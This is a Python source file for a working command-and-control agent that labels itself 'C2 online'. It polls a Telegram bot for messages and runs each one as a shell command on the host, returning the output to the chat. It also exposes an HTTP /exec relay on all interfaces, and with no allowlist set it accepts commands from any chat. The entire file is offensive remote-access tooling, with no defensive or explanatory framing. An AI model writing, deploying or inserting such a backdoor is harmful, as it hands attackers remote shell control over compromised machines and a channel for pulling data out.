#!/usr/bin/env python3
import json
import os
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TOKEN = os.environ.get("TG_TOKEN", "").strip()
API = "https://api.telegram.org/bot{}/".format(TOKEN)
ALLOWED = os.environ.get("TG_ALLOW", "").strip()
TIMEOUT = int(os.environ.get("TG_TIMEOUT", "60"))
CWD = os.environ.get("TG_CWD") or os.getcwd()
MAX_OUT = 4000
HTTP_BIND = os.environ.get("TG_HTTP_BIND", "0.0.0.0").strip()
HTTP_PORT = int(os.environ.get("TG_HTTP_PORT", "8080"))
HTTP_TOKEN = os.environ.get("TG_HTTP_TOKEN", "").strip()
EXEC_LOCK = threading.Lock()

HELP = (
    "C2 online.\n"
    "kol message = commande shell\n"
    "/cwd  - current dir\n"
    "/ping - liveness\n"
    "/help - help"
)


def api(method, params=None, timeout=90):
    url = API + method
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())


def send(chat_id, text):
    text = text if text else "(empty)"
    for i in range(0, len(text), MAX_OUT):
        chunk = text[i:i + MAX_OUT]
        try:
            api("sendMessage", {"chat_id": chat_id, "text": chunk})
        except Exception as e:
            print("send failed: {}".format(e), file=sys.stderr)


def shell(cmd):
    with EXEC_LOCK:
        return _shell(cmd)


def _shell(cmd):
    global CWD
    cmd = cmd.strip()
    if not cmd:
        return ""
    if cmd.split()[0] == "cd":
        parts = cmd.split(None, 1)
        target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
        target = os.path.expanduser(target)
        if not os.path.isabs(target):
            target = os.path.join(CWD, target)
        target = os.path.abspath(target)
        if not os.path.isdir(target):
            return "cd: no such directory: {}".format(target)
        CWD = target
        return CWD
    try:
        p = subprocess.run(cmd, shell=True, cwd=CWD, capture_output=True,
                           text=True, errors="replace", timeout=TIMEOUT)
    except subprocess.TimeoutExpired:
        return "timeout after {}s".format(TIMEOUT)
    except OSError as e:
        return "exec error: {}".format(e)
    out = (p.stdout or "") + (p.stderr or "")
    if not out:
        out = "(no output, rc={})".format(p.returncode)
    elif p.returncode != 0:
        out += "\n[rc={}]".format(p.returncode)
    return out


class Relay(BaseHTTPRequestHandler):
    server_version = "c2relay"

    def do_GET(self):
        if self.path.split("?")[0] == "/health":
            self._reply(200, "ok")
        else:
            self._reply(404, "not found")

    def do_POST(self):
        if self.path.split("?")[0] != "/exec":
            return self._reply(404, "not found")
        tok = self.headers.get("X-Token", "") or ""
        if not tok and self.headers.get("Authorization", "").startswith("Bearer "):
            tok = self.headers.get("Authorization")[7:].strip()
        if tok != HTTP_TOKEN:
            return self._reply(401, "unauthorized")
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        if (self.headers.get("Content-Type") or "").startswith("application/json"):
            try:
                body = json.loads(body).get("cmd", "")
            except (ValueError, AttributeError):
                return self._reply(400, "bad json")
        body = body.strip()
        if not body:
            return self._reply(400, "empty command")
        print("[http>] {}".format(body[:200]))
        out = shell(body)
        print("[http<] {}".format(out[:300].replace("\n", " | ")))
        self._reply(200, out)

    def _reply(self, code, text):
        data = (text or "").encode("utf-8", "replace")
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        print("[http] " + (fmt % args), file=sys.stderr)


def start_http():
    srv = ThreadingHTTPServer((HTTP_BIND, HTTP_PORT), Relay)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print("[+] http relay: {}:{}/exec".format(HTTP_BIND, HTTP_PORT))


def main():
    if not TOKEN:
        sys.exit("TG_TOKEN env var missing")
    if HTTP_TOKEN:
        start_http()
    else:
        print("[!] TG_HTTP_TOKEN not set - http relay disabled")
    try:
        me = api("getMe")
    except urllib.error.HTTPError as e:
        sys.exit("Telegram auth failed: HTTP {}".format(e.code))
    print("[+] bot: @{}".format(me["result"]["username"]))
    if ALLOWED:
        print("[+] allowlist: {}".format(ALLOWED))
    else:
        print("[!] no TG_ALLOW set - accepting any chat")
    offset = 0
    while True:
        try:
            upd = api("getUpdates", {"offset": offset, "timeout": 50}, timeout=70)
        except (urllib.error.URLError, OSError, ValueError) as e:
            print("[!] poll error: {}".format(e), file=sys.stderr)
            time.sleep(3)
            continue
        for u in upd.get("result", []):
            offset = u["update_id"] + 1
            m = u.get("message") or {}
            chat = (m.get("chat") or {}).get("id")
            text = (m.get("text") or "").strip()
            if chat is None or not text:
                continue
            if ALLOWED and str(chat) != ALLOWED:
                print("[!] drop chat {}".format(chat))
                continue
            print("[>] {} : {}".format(chat, text))
            if text in ("/start", "/help"):
                send(chat, HELP)
                continue
            if text == "/ping":
                send(chat, "pong")
                continue
            if text == "/cwd":
                send(chat, CWD)
                continue
            if text.startswith("/"):
                send(chat, "unknown command, /help")
                continue
            try:
                api("sendChatAction", {"chat_id": chat, "action": "typing"})
            except Exception:
                pass
            out = shell(text)
            print("[<] {}".format(out[:300].replace("\n", " | ")))
            send(chat, out)


if __name__ == "__main__":
    main()
